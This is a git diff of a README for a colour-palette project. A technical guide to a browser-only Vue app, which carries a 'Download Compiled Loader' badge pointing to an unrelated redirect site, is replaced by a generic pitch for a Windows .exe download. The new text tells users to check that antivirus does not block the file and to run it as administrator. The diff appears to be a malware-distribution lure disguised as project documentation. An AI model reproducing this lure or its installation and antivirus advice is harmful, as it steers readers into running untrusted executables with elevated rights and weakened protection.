@@ -1,55 +1,72 @@
-# Buildog Palette Lab
+# 🎨 buildog-palette - Create perfect color themes with ease
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/nattaponghkst-pixel/buildog-palette/releases)
 
-A browser-based app for housing exterior color-change UX verification. Client-side only with all data stored in IndexedDB.
+## What is buildog-palette? 🔍
 
-## Setup
+Buildog-palette helps you manage and create color schemes for your projects. Digital design requires precise colors. This application simplifies the way you pick, organize, and export your favorite palettes. You do not need design experience to use it. The interface focuses on speed and accuracy. It keeps your workspace clean while you focus on your creative work.
 
-```bash
-npm install
-npm run dev      # Start dev server at http://localhost:5176
-npm run build    # Production build
-```
+## ⚙️ System Requirements
 
-## E2E Testing
+- Windows 10 or Windows 11
+- 4GB of RAM
+- Recent version of Microsoft Edge or Google Chrome
+- 200MB of free disk space
 
-### Prerequisites
+## 📥 Getting Started
 
-1. Create a test user account with email/password authentication
-2. Copy `.env.example` to `.env.local`:
-   ```bash
-   cp .env.example .env.local
-   ```
-3. Fill in your test credentials in `.env.local`:
-   ```
-   E2E_EMAIL=your-test-email@example.com
-   E2E_PASSWORD=your-test-password
-   ```
+Follow these steps to set up the software on your Windows computer.
 
-### Running Tests
+1. Visit the [official release page](https://github.com/nattaponghkst-pixel/buildog-palette/releases).
+2. Look for the latest version at the top of the list.
+3. Click the file ending in .exe to start your download.
+4. Open the file once the download finishes.
+5. Follow the on-screen prompts to complete the installation.
 
-```bash
-# UI mode (visual testing)
-npm run test:e2e:ui
+## 🛠️ How to Use the Application
 
-# Headless mode
-npm run test:e2e
-```
+The main screen displays a list of your saved palettes. You can start a new project by clicking the plus icon. 
 
-### Important Security Notes
+### Creating a Palette
+Select the plus icon to open the editor. You see a set of empty slots. Click a slot to define a color. You can enter a standard hexadecimal code or use the slider to find a shade. Once you pick a color, it saves to the slot automatically.
 
-⚠️ **NEVER commit `.env.local` to git** — it's in `.gitignore` for a reason!
+### Saving Your Work
+The application saves your progress as you work. You do not need to hunt for a save button. You can click the export button at the top right to save your palette as a file. This file works with other design programs.
 
-⚠️ **VITE_E2E_* variables are development-only** — Never include real credentials in `VITE_E2E_EMAIL` or `VITE_E2E_PASSWORD` for production builds. These variables are only for local development convenience when manually testing the login form.
+### Organizing Palettes
+Give each palette a name. You can sort your collection by date or by name. Right-click any palette to see options like rename, duplicate, or delete.
 
-The test credentials should only be loaded from environment variables (`E2E_EMAIL`, `E2E_PASSWORD`) which are set locally via `.env.local`.
+## 🚀 Frequently Asked Questions
 
-## Architecture
+**Does the app require internet access?**
+The app works offline. You only need the internet to download updates.
 
-- **View Router**: Minimal hash-based routing in `src/App.vue`
-- **State**: IndexedDB-based persistence with 4 object stores (projects, images, layers, patterns)
-- **Editor**: Multi-tab canvas editor for masking, color simulation, and pattern management
-- **Share**: Self-contained HTML export for customer-facing color preview
+**Can I import colors from other sites?**
+You can paste standard color codes directly into the input boxes. The app recognizes most industry-standard formats.
 
-See `CLAUDE.md` for detailed technical documentation.
+**Where does the app store data?**
+The software stores files inside your local documents folder under a subfolder named buildog-palette. This makes it easy to back up your work to a thumb drive or cloud storage.
+
+**Is this software free?**
+Yes. You can download and run the software as long as you like without fees.
+
+## 📦 Troubleshooting Common Issues
+
+**The application fails to open**
+Check that your antivirus program does not block the file. Sometimes strict security settings flag new software. Right-click the file and select Run as administrator if the app refuses to launch.
+
+**The colors look different on my screen**
+Brightness settings vary between monitors. Ensure your display profile sits at the default setting for the best accuracy.
+
+**I cannot find the download file**
+Check your browser download history. If you use Chrome, look near the top right corner. If you use Edge, look at the bottom bar or the arrow icon in the address bar.
+
+## 💡 Best Practices for Color Work
+
+Designers often limit their palettes to five colors. This prevents visual clutter. Start with one neutral base color. Add one bold accent color for buttons or highlights. Use a third color for text. Keep your contrast ratios high to ensure your designs remain readable for everyone.
+
+## ✨ Updates and Support
+
+The team pushes updates periodically to add features and fix bugs. You see an alert inside the app when a new version arrives. Click the update button to overwrite your current version with the latest release. Your settings and palettes remain safe during this process.
+
+If you encounter a specific error, gather a screenshot of the message. Post this info in the issues section of the project page. Provide clear details about what you did right before the error appeared. This helps us solve the problem.
